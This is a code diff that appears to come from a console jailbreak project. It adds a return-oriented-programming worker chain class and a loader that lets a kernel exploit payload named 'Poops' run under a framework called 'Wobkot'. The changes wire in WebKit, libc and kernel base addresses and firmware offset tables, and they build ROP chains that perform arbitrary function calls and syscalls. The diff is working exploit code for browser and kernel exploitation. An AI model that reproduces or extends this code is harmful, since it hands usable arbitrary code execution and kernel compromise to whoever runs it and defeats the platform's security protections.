@@ -4,9 +4,83 @@ const WATCHDOG_MS = 15000;
 const CHAIN_STACK_SIZE = 0x80000;
 const CHAIN_RESERVED = 0x10000;
 
+// Wobkot deliberately exposes only a small general-purpose payload chain. Poops
+// needs the old arbitrary worker chain for its batched calls and racing threads,
+// so construct that backend lazily and keep it private to this payload.
+class poops_worker_rop extends rop {
+  constructor(p, stack_size, reserved_stack) {
+    super(p, stack_size, reserved_stack);
+    this.p.pre_chain(this);
+  }
+  clear() {
+    super.clear();
+    this.p.pre_chain(this);
+  }
+  async call(rip, rdi, rsi, rdx, rcx, r8, r9) {
+    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+    this.write_result(this.return_value);
+    await this.run();
+    return this.p.read8(this.return_value);
+  }
+  async syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
+    return this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+  }
+  add_syscall_ret(retstore, sysc, rdi, rsi, rdx, rcx, r8, r9) {
+    this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
+    this.write_result(retstore);
+  }
+  async run() {
+    await this.p.launch_chain(this);
+    this.clear();
+  }
+}
+
+async function preparePoopsRuntime(api) {
+  if (api.chain && api.chain.stack_entry_point) return null;
+  if (!window.__poopsRuntimeReady) {
+    window.__poopsRuntimeReady = (async () => {
+      if (typeof load_script !== "function")
+        throw new Error("Wobkot's classic-script loader is unavailable");
+      await load_script("src/main.js");
+      if (!window.offsetsLoaded)
+        throw new Error("the Poops firmware table loader did not start");
+      await window.offsetsLoaded;
+      if (typeof globalThis.prepareRop !== "function")
+        throw new Error("the Poops worker runtime did not initialize");
+      return globalThis.prepareRop(api.p, {
+        WorkerRop: poops_worker_rop,
+        libSceNKWebKitBase: api.libSceNKWebKitBase,
+        libSceLibcInternalBase: api.libSceLibcInternalBase,
+        libKernelBase: api.libKernelBase,
+      });
+    })();
+  }
+  return window.__poopsRuntimeReady;
+}
+
+function usePoopsRuntime(api, runtime) {
+  if (!runtime) return api;
+  const out = Object.create(api);
+  for (const [name, value] of Object.entries({
+    p: runtime.p,
+    chain: runtime.chain,
+    __poopsDirectChain: runtime.chain,
+    gadgets: runtime.p.gadgets,
+    syscalls: runtime.p.syscalls,
+    libSceNKWebKitBase: runtime.p.libSceNKWebKitBase,
+    libSceLibcInternalBase: runtime.p.libSceLibcInternalBase,
+    libKernelBase: runtime.p.libKernelBase,
+  })) {
+    Object.defineProperty(out, name, { value, enumerable: true, configurable: true });
+  }
+  return out;
+}
+
+
 // Count ROP slots locally: the gated chain counts recorded operations.
 // Reproduce fcall padding from the exposed stack entry point.
 function makeWorkerChain(api) {
+  if (api.__poopsDirectChain) return api.__poopsDirectChain;
   const gated = api.chain;
   const gadgets = api.gadgets;
   const entryPoint = gated.stack_entry_point;
@@ -762,6 +836,14 @@ function disarmKrw(handle) {
     await api.log(
       "this session already holds a krw handle, so the kernel has already been hit. " +
       "poops fires its trigger on top of that state and will not run here.", "warn");
+    return;
+  }
+
+  try {
+    api = usePoopsRuntime(api, await preparePoopsRuntime(api));
+  } catch (e) {
+    await api.log("could not start the Poops Wobkot compatibility runtime: " +
+      (e && e.message ? e.message : e), "error");
     return;
   }
 
